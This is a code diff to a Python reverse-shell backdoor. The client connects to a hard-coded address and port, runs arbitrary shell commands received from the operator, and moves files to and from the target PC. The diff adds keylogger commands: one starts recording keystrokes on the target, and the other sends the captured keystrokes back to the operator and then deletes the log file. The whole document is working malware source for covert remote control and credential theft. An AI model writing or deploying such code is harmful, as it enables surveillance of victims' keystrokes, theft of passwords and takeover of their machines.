@@ -6,7 +6,7 @@ import subprocess
 import json
 import base64
 import threading
-#import keylogger
+import keylogger
 import requests
 #from mss import mss
 
@@ -48,6 +48,8 @@ def shell():
             help_options = '''\tdownload file --> Downlad a file from target PC.
 \tupload file   --> Upload a file to target PC.
 \tget url       --> Downlad a file to target PC from a website.
+\tkeylog_start  --> Start keylogger to record keystrokes on target PC.
+\tkeylog_dump   --> Retrieve keystrokes from target PC.
 \tq             --> exit shell'''
             reliable_send(help_options)
 
@@ -85,19 +87,20 @@ def shell():
         #         reliable_send("[-] Failed to send screenshot")
 
         elif command[:12] == "keylog_start":
-            print("i m here")
             t1 = threading.Thread(target=keylogger.start)
             t1.start()
         elif command[:11] == "keylog_dump":
             fn = open(keylogger_path, "r")
             reliable_send(fn.read())
+            os.remove(keylogger_path)
         else:
             proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,
                                     stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             result = proc.stdout.read() + proc.stderr.read()
             reliable_send(result)
 
-keylogger_path = "/home/as/Desktop/keystrokes.txt"
+
+keylogger_path = os.getcwd() + "/keystrokes.txt"
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 sock.connect(("10.0.0.74", 54321))
